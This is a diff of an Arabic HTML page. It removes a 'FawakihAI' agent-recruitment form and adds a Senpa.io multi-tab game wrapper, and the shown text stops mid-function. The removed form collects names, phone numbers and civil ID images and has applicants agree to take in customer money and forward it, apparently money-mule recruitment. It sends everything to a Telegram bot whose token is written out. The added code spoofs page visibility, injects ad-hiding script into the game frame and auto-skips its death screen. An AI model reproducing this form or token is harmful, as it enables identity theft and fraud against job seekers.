@@ -2,313 +2,930 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل وكلاء الكويت | FawakihAI</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Senpa.io - Ultimate Edition | ريماس التيم</title>
     <style>
-        :root {
-            --primary-gradient: linear-gradient(135deg, #2E7D32 0%, #43A047 100%);
-            --accent-color: #FFD600;
-            --danger-color: #e53935;
-            --glass-bg: rgba(255, 255, 255, 0.95);
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-
-        * { box-sizing: border-box; }
 
         body {
-            font-family: 'Cairo', sans-serif;
-            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), 
-                        url('https://images.unsplash.com/photo-1610832958506-aa56368176cf?auto=format&fit=crop&q=80&w=2070') no-repeat center center fixed;
-            background-size: cover;
-            margin: 0;
-            padding: 40px 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #333;
-        }
-
-        .container {
-            background: var(--glass-bg);
-            max-width: 650px;
-            width: 100%;
-            padding: 40px;
-            border-radius: 24px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.3);
-            backdrop-filter: blur(10px);
-        }
-
-        .header-section {
-            text-align: center;
-            margin-bottom: 35px;
-        }
-
-        .header-section h1 {
-            color: #1b5e20;
-            font-weight: 800;
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-
-        .status-badge {
-            background: var(--primary-gradient);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             color: white;
-            padding: 5px 15px;
-            border-radius: 50px;
-            font-size: 14px;
-            display: inline-block;
-            margin-bottom: 15px;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            position: fixed;
+            touch-action: none;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-touch-callout: none;
         }
 
-        .warning-box {
-            background-color: #fff9c4;
-            border-right: 5px solid #fbc02d;
-            padding: 15px;
-            border-radius: 12px;
-            margin: 20px 0;
-            font-size: 14px;
-            line-height: 1.7;
-            font-weight: 600;
-            color: #5d4037;
-        }
-
-        .form-group { margin-bottom: 22px; }
-
-        .form-row {
+        /* شريط التبويبات العلوي */
+        .tabs-container {
             display: flex;
-            gap: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid rgba(102, 126, 234, 0.5);
+            height: 45px;
+            align-items: center;
+            padding: 0 10px;
+            gap: 5px;
+            z-index: 1000;
+            position: relative;
         }
 
-        .form-row .form-group { flex: 1; }
-
-        label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 700;
-            font-size: 14px;
-            color: #2e7d32;
-        }
-
-        input[type="text"], input[type="email"], input[type="tel"], input[type="file"] {
-            width: 100%;
-            padding: 14px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-family: 'Cairo', sans-serif;
-            font-size: 15px;
+        .tab {
+            padding: 8px 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px 8px 0 0;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: bold;
             transition: all 0.3s ease;
-            background: #fdfdfd;
+            color: #ccc;
+            white-space: nowrap;
+            min-width: 120px;
+            text-align: center;
         }
 
-        input:focus {
-            outline: none;
-            border-color: #4caf50;
-            box-shadow: 0 0 10px rgba(76, 175, 80, 0.2);
-            background: #fff;
+        .tab.active {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-color: #667eea;
+            color: white;
+            box-shadow: 0 0 20px rgba(102, 126, 234, 0.5);
+            transform: translateY(-2px);
         }
 
-        /* شرط الموافقة */
-        .agreement-container {
-            background: #f1f8e9;
-            padding: 15px;
-            border-radius: 12px;
-            margin-top: 10px;
+        .tab:hover:not(.active) {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #667eea;
+            transform: translateY(-1px);
+        }
+
+        .tab-indicator {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #4ade80;
+            display: inline-block;
+            margin-left: 8px;
+            box-shadow: 0 0 10px #4ade80;
+        }
+
+        .tab-indicator.inactive {
+            background: #ef4444;
+            box-shadow: 0 0 10px #ef4444;
+        }
+
+        /* حاوية الألعاب */
+        .games-wrapper {
+            position: relative;
+            height: calc(100vh - 45px);
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .game-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+            will-change: transform, opacity;
+            transform: translateZ(0);
+            backface-visibility: hidden;
+        }
+
+        .game-frame.active {
+            opacity: 1;
+            pointer-events: all;
+            z-index: 10;
+        }
+
+        .game-frame.background {
+            opacity: 0;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* لوحة التحكم */
+        .control-panel {
+            position: fixed;
+            top: 55px;
+            right: 20px;
+            background: rgba(10, 10, 20, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            min-width: 250px;
+            z-index: 9999;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .panel-title {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-align: center;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .setting-row {
             display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            border: 1px dashed #2e7d32;
+            justify-content: space-between;
+            align-items: center;
+            margin: 10px 0;
+            padding: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
         }
 
-        .agreement-container input[type="checkbox"] {
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 25px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);
+        }
+
+        .btn-instagram {
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            color: white;
+            margin-top: 15px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .fps-counter {
+            position: fixed;
+            top: 55px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            color: #4ade80;
+            z-index: 9999;
+            border: 1px solid rgba(74, 222, 128, 0.3);
+        }
+
+        .key-bind-indicator {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 12px;
+            color: #ccc;
+            z-index: 9999;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(102, 126, 234, 0.9);
+            color: white;
+            padding: 10px 25px;
+            border-radius: 25px;
+            font-size: 13px;
+            font-weight: bold;
+            z-index: 10000;
+            animation: fadeInOut 2s ease;
+            pointer-events: none;
+        }
+
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            20% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            80% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 50px;
+            height: 26px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 13px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .toggle-switch.active {
+            background: #667eea;
+        }
+
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
             width: 22px;
             height: 22px;
-            cursor: pointer;
-            accent-color: #2e7d32;
-            margin-top: 3px;
+            background: white;
+            border-radius: 50%;
+            top: 2px;
+            left: 2px;
+            transition: 0.3s;
         }
 
-        .agreement-text {
-            font-size: 13.5px;
-            line-height: 1.6;
-            color: #1b5e20;
-            font-weight: 600;
+        .toggle-switch.active::after {
+            left: 26px;
         }
 
-        .btn-submit {
-            background: var(--primary-gradient);
-            color: #fff;
-            border: none;
-            padding: 18px;
+        .instagram-svg {
+            width: 18px;
+            height: 18px;
+            fill: white;
+        }
+
+        .respawn-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            border-radius: 12px;
-            font-family: 'Cairo', sans-serif;
-            font-size: 18px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.4s;
-            margin-top: 15px;
-            box-shadow: 0 6px 15px rgba(46, 125, 50, 0.3);
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10001;
+            backdrop-filter: blur(5px);
         }
 
-        .btn-submit:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(46, 125, 50, 0.4);
-            filter: brightness(1.1);
-        }
-
-        .btn-submit:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .footer-note {
+        .respawn-modal {
+            background: linear-gradient(135deg, #1e1b4b, #312e81);
+            padding: 40px;
+            border-radius: 20px;
             text-align: center;
-            margin-top: 25px;
-            font-size: 13px;
-            color: #666;
-            border-top: 1px solid #eee;
-            padding-top: 15px;
+            border: 2px solid rgba(102, 126, 234, 0.5);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            animation: scaleIn 0.3s ease;
         }
 
-        @media (max-width: 500px) {
-            .form-row { flex-direction: column; gap: 0; }
-            .container { padding: 25px; }
+        @keyframes scaleIn {
+            from { transform: scale(0.5); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .respawn-btn {
+            margin-top: 20px;
+            padding: 15px 40px;
+            font-size: 18px;
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-weight: bold;
+        }
+
+        .respawn-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 30px rgba(239, 68, 68, 0.5);
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header-section">
-            <div class="status-badge">فرصة انضمام كوكيل رسمي 🇰🇼</div>
-            <h1>FawakihAI - وكلاء الكويت</h1>
-            <p style="color: #666; font-size: 14px;">نسعى لتسهيل عمليات الدفع لعملائنا عبر خدمة ومض (WAMD)</p>
+    <!-- عداد FPS -->
+    <div class="fps-counter" id="fpsCounter">FPS: 60</div>
+
+    <!-- شريط التبويبات -->
+    <div class="tabs-container" id="tabsContainer">
+        <div class="tab active" data-tab="0" onclick="switchTab(0)">
+            اللعبة 1 <span class="tab-indicator"></span>
         </div>
-
-        <div class="warning-box">
-            ⚠️ <b>إقرار قانوني:</b> التلاعب في الودائع أو المبالغ المرسلة إليك يعرضك للمساءلة القانونية المباشرة. سيتم التحقق من هويتك بدقة.
-        </div>
-
-        <form id="agentForm">
-            <div class="form-row">
-                <div class="form-group">
-                    <label>الاسم الأول</label>
-                    <input type="text" id="firstName" required placeholder="مثال: أحمد">
-                </div>
-                <div class="form-group">
-                    <label>الكنية (العائلة)</label>
-                    <input type="text" id="lastName" required placeholder="مثال: الصباح">
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>البريد الإلكتروني</label>
-                <input type="email" id="email" required placeholder="name@example.com">
-            </div>
-
-            <div class="form-group">
-                <label>رقم الهاتف الخلوي الكويتي 🇰🇼</label>
-                <input type="tel" id="phone" required placeholder="+965 5XXXXXXX" dir="ltr">
-                <small style="color: #666; font-size: 11px; margin-top: 5px; display: block;">* يجب أن يكون رقماً كويتياً صالحاً (يبدأ بـ 5 أو 6 أو 9)</small>
-            </div>
-
-            <div class="form-group">
-                <label>السيرة الذاتية أو صورة البطاقة المدنية (CV)</label>
-                <input type="file" id="cvFile" accept=".pdf,.jpg,.jpeg,.png" required>
-            </div>
-
-            <div class="agreement-container">
-                <input type="checkbox" id="agreeTerms" required>
-                <label for="agreeTerms" class="agreement-text">
-                    أوافق على استلام مبالغ العملاء في حسابي وتحويلها مباشرة لمطور التطبيق. كما أقر بأن التواصل الرسمي سيكون حصراً عبر رقم هاتفي المسجل أعلاه، وأتحمل المسؤولية الكاملة عن دقة البيانات.
-                </label>
-            </div>
-
-            <button type="submit" id="submitBtn" class="btn-submit">تقديم الطلب الآن</button>
-        </form>
-
-        <div class="footer-note">
-            🛡️ جميع البيانات مشفرة وتخضع لسياسة الخصوصية الصارمة لشركة FawakihAI.
+        <div class="tab" data-tab="1" onclick="switchTab(1)">
+            اللعبة 2 <span class="tab-indicator inactive"></span>
         </div>
     </div>
 
-    <script>
-        const BOT_TOKEN = '7894436976:AAFdg77dpzCgpeLnkwAQqP9POkwZMwWoikg';
-        const CHAT_ID = '5998250367';
+    <!-- حاوية الألعاب -->
+    <div class="games-wrapper" id="gamesWrapper">
+        <iframe class="game-frame active" id="gameFrame0" src="about:blank" allow="camera;microphone;autoplay"></iframe>
+        <iframe class="game-frame background" id="gameFrame1" src="about:blank" allow="camera;microphone;autoplay"></iframe>
+    </div>
 
-        // دالة التحقق من الرقم الكويتي
-        function validateKuwaitPhone(phone) {
-            // نمط يطابق +965 أو 965 متبوعاً بـ 5 أو 6 أو 9 ثم 7 أرقام
-            const pattern = /^(?:\+965|965)?[569]\d{7}$/;
-            return pattern.test(phone.replace(/\s/g, ''));
+    <!-- لوحة التحكم -->
+    <div class="control-panel" id="controlPanel">
+        <div class="panel-title">⚡ ريماس التيم - الإعدادات</div>
+        
+        <div class="setting-row">
+            <span>إظهار زر الانستغرام</span>
+            <div class="toggle-switch active" id="instagramToggle" onclick="toggleInstagram()"></div>
+        </div>
+        
+        <div class="setting-row">
+            <span>إخفاء معرف اللاعب</span>
+            <div class="toggle-switch active" id="hideIdToggle" onclick="toggleHideId()"></div>
+        </div>
+        
+        <div class="setting-row">
+            <span>مفتاح التبديل الحالي</span>
+            <button class="btn btn-primary" id="keyBindBtn" onclick="rebindKey()">Tab</button>
+        </div>
+
+        <div class="setting-row">
+            <span>تثبيت الشاشة</span>
+            <div class="toggle-switch active" id="lockScreenToggle" onclick="toggleScreenLock()"></div>
+        </div>
+
+        <button class="btn btn-instagram" onclick="openInstagram()">
+            <svg class="instagram-svg" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+            </svg>
+            Instagram
+        </button>
+    </div>
+
+    <!-- مؤشر المفتاح -->
+    <div class="key-bind-indicator">
+        اضغط <strong id="currentKey">Tab</strong> للتبديل بين التبويبات
+    </div>
+
+    <script>
+        // ============ الإعدادات والتكوين ============
+        const CONFIG = {
+            gameURL: 'https://senpa.io',
+            instagramLink: 'https://www.instagram.com/6i99n?igsh=MW1wMTNpamJpMWNxeg==',
+            maxTabs: 2,
+            defaultKey: 'Tab',
+            respawnKey: 'Escape'
+        };
+
+        // ============ الحالة العامة ============
+        let state = {
+            activeTab: 0,
+            isRebinding: false,
+            switchKey: localStorage.getItem('remas_switch_key') || CONFIG.defaultKey,
+            showInstagram: JSON.parse(localStorage.getItem('remas_instagram') || 'true'),
+            hideId: JSON.parse(localStorage.getItem('remas_hide_id') || 'true'),
+            screenLocked: JSON.parse(localStorage.getItem('remas_screen_lock') || 'true'),
+            tabs: [
+                { id: 'tab_' + Date.now() + '_0', frame: null, loaded: false },
+                { id: 'tab_' + Date.now() + '_1', frame: null, loaded: false }
+            ],
+            fps: 60,
+            lastFrameTime: performance.now(),
+            frameCount: 0,
+            fpsUpdateInterval: null
+        };
+
+        // ============ مانع تجميد الفريمات (Anti-Freeze) ============
+        function preventFrameFreeze() {
+            // خداع المتصفح بأن الصفحة مرئية دائماً
+            Object.defineProperty(document, 'hidden', { 
+                get: function() { return false; },
+                configurable: true
+            });
+            
+            Object.defineProperty(document, 'visibilityState', { 
+                get: function() { return 'visible'; },
+                configurable: true
+            });
+
+            // منع تجميد المؤقتات
+            const originalSetInterval = window.setInterval;
+            window.setInterval = function(callback, delay, ...args) {
+                return originalSetInterval(callback, Math.max(delay, 0), ...args);
+            };
+
+            // منع أحداث إخفاء الصفحة
+            ['visibilitychange', 'pagehide', 'blur', 'freeze'].forEach(event => {
+                window.addEventListener(event, (e) => {
+                    e.stopImmediatePropagation();
+                    e.stopPropagation();
+                }, true);
+                
+                document.addEventListener(event, (e) => {
+                    e.stopImmediatePropagation();
+                    e.stopPropagation();
+                }, true);
+            });
+
+            // طلب إطار رسومي باستمرار للحفاظ على النشاط
+            function keepAlive() {
+                requestAnimationFrame(keepAlive);
+            }
+            requestAnimationFrame(keepAlive);
+
+            console.log('✅ نظام منع تجميد الفريمات نشط');
         }
 
-        document.getElementById('agentForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const phone = document.getElementById('phone').value;
-            const agree = document.getElementById('agreeTerms').checked;
-
-            if (!validateKuwaitPhone(phone)) {
-                alert('⚠️ يرجى إدخال رقم هاتف كويتي خلوي صحيح يبدأ بـ 5 أو 6 أو 9.');
-                return;
-            }
-
-            if (!agree) {
-                alert('⚠️ يجب الموافقة على شروط تحويل الأموال للمتابعة.');
-                return;
-            }
-
-            const btn = document.getElementById('submitBtn');
-            btn.disabled = true;
-            btn.innerHTML = 'جاري إرسال طلبك الموثق...';
-
-            const firstName = document.getElementById('firstName').value;
-            const lastName = document.getElementById('lastName').value;
-            const email = document.getElementById('email').value;
-            const fileInput = document.getElementById('cvFile');
-
-            const messageText = `
-🚀 **طلب وكيل كويت جديد** 🚀
-━━━━━━━━━━━━━━━━━━
-👤 **الاسم:** ${firstName} ${lastName}
-📧 **البريد:** ${email}
-📱 **الهاتف:** ${phone}
-⚖️ **حالة الموافقة:** تم الموافقة على شروط التحويل والمتابعة.
-━━━━━━━━━━━━━━━━━━
-            `;
-
-            try {
-                const file = fileInput.files[0];
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('caption', messageText);
-                formData.append('document', file);
-                formData.append('parse_mode', 'Markdown');
-
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                const result = await response.json();
+        // ============ نظام FPS ============
+        function initFPSCounter() {
+            state.fpsUpdateInterval = setInterval(() => {
+                const now = performance.now();
+                const delta = now - state.lastFrameTime;
+                state.lastFrameTime = now;
                 
-                if (result.ok) {
-                    alert('✅ تم استلام طلبك بنجاح! سيقوم فريق التطوير بالتواصل معك عبر الرقم: ' + phone);
-                    document.getElementById('agentForm').reset();
-                } else {
-                    alert('❌ خطأ في الإرسال: ' + result.description);
+                if (delta > 0) {
+                    state.fps = Math.round(1000 / delta);
+                    const fpsElement = document.getElementById('fpsCounter');
+                    if (fpsElement) {
+                        fpsElement.textContent = `FPS: ${state.fps}`;
+                        
+                        // تغيير اللون حسب الأداء
+                        if (state.fps >= 55) {
+                            fpsElement.style.color = '#4ade80';
+                            fpsElement.style.borderColor = 'rgba(74, 222, 128, 0.3)';
+                        } else if (state.fps >= 30) {
+                            fpsElement.style.color = '#fbbf24';
+                            fpsElement.style.borderColor = 'rgba(251, 191, 36, 0.3)';
+                        } else {
+                            fpsElement.style.color = '#ef4444';
+                            fpsElement.style.borderColor = 'rgba(239, 68, 68, 0.3)';
+                        }
+                    }
                 }
-            } catch (error) {
-                alert('❌ فشل الاتصال بالخادم. تأكد من الإنترنت وحاول مجدداً.');
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = 'تقديم الطلب الآن';
+            }, 1000);
+        }
+
+        // ============ نظام تثبيت الشاشة ============
+        function lockScreen() {
+            if (!state.screenLocked) return;
+
+            // منع السحب والتكبير
+            document.addEventListener('touchmove', (e) => {
+                if (e.scale !== 1) {
+                    e.preventDefault();
+                }
+            }, { passive: false });
+
+            document.addEventListener('gesturestart', (e) => {
+                e.preventDefault();
+            });
+
+            // منع النقر المزدوج للتكبير
+            let lastTouchEnd = 0;
+            document.addEventListener('touchend', (e) => {
+                const now = Date.now();
+                if (now - lastTouchEnd <= 300) {
+                    e.preventDefault();
+                }
+                lastTouchEnd = now;
+            }, false);
+
+            // تطبيق أنماط CSS لمنع التمرير غير المرغوب
+            const style = document.createElement('style');
+            style.id = 'screenLockStyles';
+            style.textContent = `
+                html, body {
+                    touch-action: none !important;
+                    overscroll-behavior: none !important;
+                    overflow: hidden !important;
+                    -webkit-touch-callout: none !important;
+                    -webkit-user-select: none !important;
+                    user-select: none !important;
+                    position: fixed !important;
+                    width: 100% !important;
+                    height: 100% !important;
+                }
+            `;
+            document.head.appendChild(style);
+
+            console.log('🔒 تم تثبيت الشاشة');
+        }
+
+        function toggleScreenLock() {
+            state.screenLocked = !state.screenLocked;
+            localStorage.setItem('remas_screen_lock', JSON.stringify(state.screenLocked));
+            
+            const toggle = document.getElementById('lockScreenToggle');
+            if (toggle) {
+                toggle.classList.toggle('active', state.screenLocked);
             }
+            
+            if (state.screenLocked) {
+                lockScreen();
+            } else {
+                const style = document.getElementById('screenLockStyles');
+                if (style) style.remove();
+            }
+            
+            showToast(state.screenLocked ? 'تم تثبيت الشاشة' : 'تم إلغاء تثبيت الشاشة');
+        }
+
+        // ============ نظام تبديل التبويبات ============
+        function switchTab(index) {
+            if (state.activeTab === index) return;
+            
+            const previousTab = state.activeTab;
+            state.activeTab = index;
+            
+            // تحديث الإطارات
+            const frames = document.querySelectorAll('.game-frame');
+            const tabs = document.querySelectorAll('.tab');
+            
+            frames.forEach((frame, i) => {
+                if (i === index) {
+                    frame.classList.add('active');
+                    frame.classList.remove('background');
+                    frame.style.opacity = '1';
+                    frame.style.pointerEvents = 'all';
+                    frame.style.zIndex = '10';
+                } else {
+                    frame.classList.remove('active');
+                    frame.classList.add('background');
+                    frame.style.opacity = '0';
+                    frame.style.pointerEvents = 'none';
+                    frame.style.zIndex = '1';
+                }
+            });
+            
+            // تحديث التبويبات المرئية
+            tabs.forEach((tab, i) => {
+                const indicator = tab.querySelector('.tab-indicator');
+                if (i === index) {
+                    tab.classList.add('active');
+                    if (indicator) {
+                        indicator.classList.remove('inactive');
+                    }
+                } else {
+                    tab.classList.remove('active');
+                    if (indicator) {
+                        indicator.classList.add('inactive');
+                    }
+                }
+            });
+            
+            // تحميل اللعبة إذا لم تكن محملة
+            if (!state.tabs[index].loaded) {
+                loadGame(index);
+            }
+            
+            // إبقاء التبويب السابق يعمل في الخلفية
+            if (previousTab !== index && state.tabs[previousTab].loaded) {
+                const previousFrame = document.getElementById(`gameFrame${previousTab}`);
+                if (previousFrame) {
+                    // إرسال رسالة للإبقاء على التشغيل
+                    previousFrame.contentWindow?.postMessage({ type: 'keepAlive' }, '*');
+                }
+            }
+            
+            showToast(`تم التبديل إلى اللعبة ${index + 1}`);
+            console.log(`🔄 تم التبديل إلى التبويب ${index + 1}`);
+        }
+
+        function loadGame(index) {
+            const frame = document.getElementById(`gameFrame${index}`);
+            if (frame && !state.tabs[index].loaded) {
+                frame.src = CONFIG.gameURL;
+                state.tabs[index].loaded = true;
+                state.tabs[index].frame = frame;
+                
+                frame.onload = () => {
+                    console.log(`✅ تم تحميل اللعبة ${index + 1}`);
+                    injectGameScripts(frame);
+                };
+            }
+        }
+
+        function injectGameScripts(frame) {
+            try {
+                const frameDoc = frame.contentDocument || frame.contentWindow.document;
+                
+                // حقن سكريبت تحسين الأداء داخل اللعبة
+                const script = frameDoc.createElement('script');
+                script.textContent = `
+                    // منع تجميد الإطار
+                    Object.defineProperty(document, 'hidden', { 
+                        get: function() { return false; },
+                        configurable: true 
+                    });
+                    
+                    Object.defineProperty(document, 'visibilityState', { 
+                        get: function() { return 'visible'; },
+                        configurable: true 
+                    });
+                    
+                    // إخفاء الإعلانات
+                    const style = document.createElement('style');
+                    style.textContent = \`
+                        #bottomAd, #senpa-io_300x250_3, #endGame, 
+                        #room-stats-hud, #socialsidebar, #preroll,
+                        #gameadsbanner-container, #right-panel, #left-panel,
+                        .ads-block-1, .banner, .advertisement,
+                        .team-players-list, .youtube-box {
+                            display: none !important;
+                            opacity: 0 !important;
+                            pointer-events: none !important;
+                        }
+                    \`;
+                    document.head.appendChild(style);
+                    
+                    // نظام التجاوب مع التبديل
+                    window.addEventListener('message', (event) => {
+                        if (event.data.type === 'keepAlive') {
+                            // الحفاظ على النشاط
+                            const noop = () => {};
+                            requestAnimationFrame(noop);
+                        }
+                    });
+                    
+                    // تخطي شاشة الموت تلقائياً
+                    setInterval(() => {
+                        const modal = document.querySelector('.modal.scale-modal');
+                        if (modal && (modal.style.opacity === '1' || modal.classList.contains('active'))) {
+                            const escEvent = new KeyboardEvent('keydown', {
+                                bubbles: true,
+                                cancelable: true,
+                                keyCode: 27,
+                                key: 'Escape',
+                                code: 'Escape'
+                            });
+                            document.dispatchEvent(escEvent);
+                        }
+                    }, 200);
+                    
+                    console.log('🎮 تم تحسين أداء اللعبة');
+                `;
+                frameDoc.head.appendChild(script);
+                
+            } catch (e) {
+                console.warn('⚠️ لا يمكن حقن السكريبت في الإطار (سياسة CORS):', e.message);
+            }
+        }
+
+        // ============ اختصارات لوحة المفاتيح ============
+        function handleKeyPress(e) {
+            // حالة إعادة تعيين المفتاح
+            if (state.isRebinding) {
+                e.preventDefault();
+                e.stopPropagation();
+                setSwitchKey(e.code);
+                state.isRebinding = false;
+                updateKeyBindButton();
+                return;
+            }
+            
+            // تبديل التبويبات
+            if (e.code === state.switchKey && !e.ctrlKey && !e.altKey && !e.metaKey) {
+                e.preventDefault();
+                const nextTab = (state.activeTab + 1) % CONFIG.maxTabs;
+                switchTab(nextTab);
+                return;
+            }
+            
+            // اختصارات رقمية للتبديل المباشر
+            if (e.ctrlKey && e.key >= '1' && e.key <= '2') {
+                e.preventDefault();
+                const tabIndex = parseInt(e.key) - 1;
+                switchTab(tabIndex);
+            }
+        }
+
+        function setSwitchKey(keyCode) {
+            state.switchKey = keyCode;
+            localStorage.setItem('remas_switch_key', keyCode);
+            
+            const currentKeyElement = document.getElementById('currentKey');
+            if (currentKeyElement) {
+                currentKeyElement.textContent = keyCode;
+            }
+            
+            showToast(`تم تعيين مفتاح التبديل: ${keyCode}`);
+        }
+
+        function rebindKey() {
+            state.isRebinding = true;
+            const btn = document.getElementById('keyBindBtn');
+            if (btn) {
+                btn.textContent = 'اضغط أي مفتاح...';
+                btn.style.animation = 'pulse 1s infinite';
+            }
+            showToast('اضغط على المفتاح الجديد للتبديل...');
+        }
+
+        function updateKeyBindButton() {
+            const btn = document.getElementById('keyBindBtn');
+            if (btn) {
+                btn.textContent = state.switchKey;
+                btn.style.animation = '';
+            }
+        }
+
+        // ============ واجهة المستخدم ============
+        function toggleInstagram() {
+            state.showInstagram = !state.showInstagram;
+            localStorage.setItem('remas_instagram', JSON.stringify(state.showInstagram));
+            
+            const toggle = document.getElementById('instagramToggle');
+            if (toggle) {
+                toggle.classList.toggle('active', state.showInstagram);
+            }
+            
+            showToast(state.showInstagram ? 'تم إظهار زر Instagram' : 'تم إخفاء زر Instagram');
+        }
+
+        function toggleHideId() {
+            state.hideId = !state.hideId;
+            localStorage.setItem('remas_hide_id', JSON.stringify(state.hideId));
+            
